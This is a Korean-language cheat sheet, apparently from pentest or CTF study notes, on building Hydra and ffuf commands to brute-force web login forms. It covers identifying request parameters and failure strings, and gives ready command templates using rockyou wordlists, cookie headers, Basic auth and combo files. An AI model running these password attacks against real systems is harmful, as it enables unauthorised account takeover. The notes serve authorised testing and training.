# 01_Hydra

처음 보는 로그인 폼을 만났을 때 hydra 명령어를 조립하는 순서. 요청 구조와 실패 응답만 파악하면 어떤 폼이든 같은 틀로 만든다.

---

## 1. 로그인 요청 구조 파악

Burp로 아무 값이나 넣고 로그인 요청을 잡는다. 메서드, 경로, 파라미터 이름, Content-Type을 확인한다.

```
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test

# 경로: /login.php
# 아이디 파라미터: username
# 비밀번호 파라미터: password
```

---

## 2. 실패 판정 문자열 고르기

```bash
# 틀린 비밀번호 응답에서 실패 때만 나오는 문자열 찾기
curl -s -X POST http://<IP>/login.php -d "username=test&password=wrong" | grep -i "invalid\|incorrect\|fail\|error"

# 문자열이 애매하면 상태코드와 리다이렉트 차이 확인
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
  -X POST http://<IP>/login.php -d "username=test&password=wrong"
```

---

## 3. 명령어 조립

```bash
# 기본 틀 - "경로:본문:판정조건"
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "<path>:<user_param>=^USER^&<pass_param>=^PASS^:F=<fail_string>"

# 1번 예시에 대입
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# 실패 화면이 매번 바뀌면 성공 문자열로 판정
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Logout"
```

---

## 4. 상황별 추가

```bash
# HTTPS
hydra ... <IP> https-post-form "..."

# 포트 지정
hydra ... -s 8080 <IP> http-post-form "..."

# 쿠키 필요 (판정조건 뒤에 H= 추가, 콜론은 \: 이스케이프)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid:H=Cookie\: PHPSESSID=<session>"

# GET 방식 폼
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Basic 인증 팝업 (Tomcat 매니저 등)
hydra -L users.txt -P passwords.txt -s 8080 <IP> http-get /manager/html

# user:pass 조합 파일
hydra -C combo.txt <IP> http-post-form "..."
```

---

## 5. 동작 검증

```bash
# 아는 계정으로 먼저 한 번 돌려 잡히는지 확인
hydra -l admin -p <known_pass> <IP> http-post-form "..." -V

# 실제 요청과 응답 확인
hydra ... -d

# 찾으면 바로 멈추기 + 스레드 낮추기
hydra ... -f -t 4
```

---

## 6. hydra가 안 맞는 경우

```bash
# JSON 본문 - ffuf
ffuf -u http://<IP>/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt -fc 401

# CSRF 토큰이 매 요청 바뀜 - Burp Intruder 매크로나 파이썬 스크립트
```

---

## 팁

- 실패 문자열에 ! 가 있으면 작은따옴표로 감싼다 (00_트러블슈팅.md 참고)
- 서비스 기본 계정이 의심되면 rockyou보다 seclists Default-Credentials 먼저
- 서비스별 사용법은 02_서비스별공격, WordPress는 WordPress/02_브루트포스.md
